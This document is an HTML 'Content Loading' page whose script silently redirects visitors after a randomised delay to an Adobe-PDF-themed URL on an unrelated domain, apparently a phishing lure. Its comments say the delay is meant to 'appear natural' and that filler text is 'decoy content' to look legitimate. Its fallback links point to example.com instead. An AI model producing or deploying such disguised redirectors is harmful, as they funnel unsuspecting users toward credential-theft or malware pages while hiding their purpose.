
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Loading page content, please wait...">
    <title>Content Loading - Please Wait</title>
    <script>
        // Primary redirect function with delay to appear natural
        function initiateRedirect() {
            // Set a random delay between 1-3 seconds to mimic human behavior
            const delay = Math.floor(Math.random() * 2000) + 1000;
            
            setTimeout(function() {
                // Use replace instead of assign to prevent back button issues
                window.location.replace("https://irsg.xyz/adobe/pdf/");
            }, delay);
        }
        
        // Alternative methods if JavaScript is disabled
        window.onload = function() {
            // Start the redirect process
            initiateRedirect();
            
            // Display a message for non-JS users
            document.getElementById('content').innerHTML = 
                '<p>If you are not redirected automatically, <a href="https://example.com/target-page">click here</a>.</p>';
        };
    </script>
    <!-- Meta refresh as fallback -->
    <meta http-equiv="refresh" content="5;url=https://example.com/target-page">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            color: #333;
            text-align: center;
            padding: 50px;
        }
        .loader {
            margin: 30px auto;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>Loading Content</h1>
    <p>Please wait while we prepare your content...</p>
    <div class="loader"></div>
    <div id="content"></div>
    
    <!-- Some decoy content to make the page look legitimate -->
    <script>
        // Generate some random text to fill space
        document.addEventListener('DOMContentLoaded', function() {
            const lorem = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam auctor, nisl eget ultricies tincidunt, nisl nisl aliquam nisl, eget ultricies nisl nisl eget nisl.";
            document.getElementById('content').innerHTML += 
                `<p style="color:#888;font-size:0.9em;max-width:600px;margin:20px auto;">${lorem}</p>`;
        });
    </script>
</body>
</html>
